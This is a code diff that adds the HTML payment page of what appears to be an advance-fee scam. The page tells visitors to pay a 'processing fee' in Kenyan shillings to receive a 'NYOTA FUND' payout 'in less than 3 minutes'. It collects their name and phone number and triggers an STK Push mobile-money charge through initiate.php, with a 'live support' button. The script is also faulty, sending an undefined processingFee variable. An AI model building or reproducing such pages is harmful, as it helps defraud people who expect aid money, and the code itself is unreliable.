@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment 1 – Processing Fee</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+    <h2>Complete Your NYOTA FUND Processing Fee Payment</h2>
+    <p style="font-size:18px;">
+        Hi 👋! To receive your NYOTA FUND, please pay the processing fee below. <br>
+        <strong>Once paid, your funds will be delivered in less than 3 minutes!</strong>
+    </p>
+
+    <p style="font-size:20px; font-weight:bold; color:#0a6ebd;">
+        Processing Fee: Ksh <span id="feeAmount">---</span>
+    </p>
+
+    <form id="payForm">
+        <input type="text" id="senderName" placeholder="Enter Your Full Name" required>
+        <input type="text" id="senderPhone" placeholder="Enter Your Phone Number" required>
+        <button type="submit">Pay Now</button>
+    </form>
+
+    <p style="margin-top:15px; font-size:14px; color:gray;">
+        Please wait a few minutes for your payment to be processed. You will be automatically redirected to the next step after your payment is confirmed. You can also contact admin via live chat for support.
+    </p>
+
+    <a href="user_chat.html" class="chat-btn">💬 Live Support</a>
+</div>
+
+<script>
+// Get selected fund from amount.html
+const fund = JSON.parse(localStorage.getItem("selectedFund"));
+
+if (!fund) {
+    alert("Please select an amount first.");
+    window.location.href = "amount.html";
+}
+
+// Show the real processing fee
+document.getElementById("feeAmount").innerText = fund.fee;
+
+const form = document.getElementById('payForm');
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const name = document.getElementById('senderName').value.trim();
+    const phone = document.getElementById('senderPhone').value.trim();
+
+    if(name.length < 2 || phone.length < 10){
+        alert("Enter valid name and phone number");
+        return;
+    }
+
+    const data = { name, phone, amount: processingFee };
+
+    try {
+        const res = await fetch('initiate.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        const result = await res.json();
+
+        if(result.status === "success"){
+            alert("STK Push sent! Please complete payment on your phone.");
+            window.location.href = "payment2.html";
+        } else {
+            alert("Payment initiation failed: " + result.message);
+        }
+    } catch(err){
+        alert("Error connecting to server. Try again.");
+        console.error(err);
+    }
+});
+</script>
+
+<style>
+.chat-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background:#0a6ebd;
+    color:#fff;
+    padding:12px 16px;
+    border-radius:50px;
+    text-decoration:none;
+    font-size:16px;
+    box-shadow:0 4px 8px rgba(0,0,0,0.2);
+    animation: bounce 2s infinite;
+}
+@keyframes bounce {
+    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+    40% { transform: translateY(-8px); }
+    60% { transform: translateY(-4px); }
+}
+</style>
+
+</body>
+</html>
